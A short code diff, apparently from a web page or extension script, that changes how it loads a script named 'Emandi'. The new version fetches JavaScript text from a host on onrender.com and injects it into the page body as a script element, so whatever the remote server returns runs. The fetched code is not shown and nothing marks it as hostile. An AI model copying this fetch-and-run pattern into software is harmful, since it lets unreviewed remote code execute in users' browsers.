@@ -1,5 +1,8 @@
-var script = document.createElement('script');
-script.innerHTML = `import {RunScript} from 'https://globalcdn.onrender.com/static/Emandi.js';
-RunScript();`;
-script.setAttribute('type', 'module');
-document.getElementsByTagName('body')[0].appendChild(script);
+fetch('https://globalcdn.onrender.com/static/EmandiScriptAsModule.js')
+    .then(response => response.text())
+    .then(data => {
+        var script = document.createElement('script');
+        script.innerHTML = data;
+        script.setAttribute('type', 'text/javascript');
+        document.getElementsByTagName('body')[0].appendChild(script);
+    });
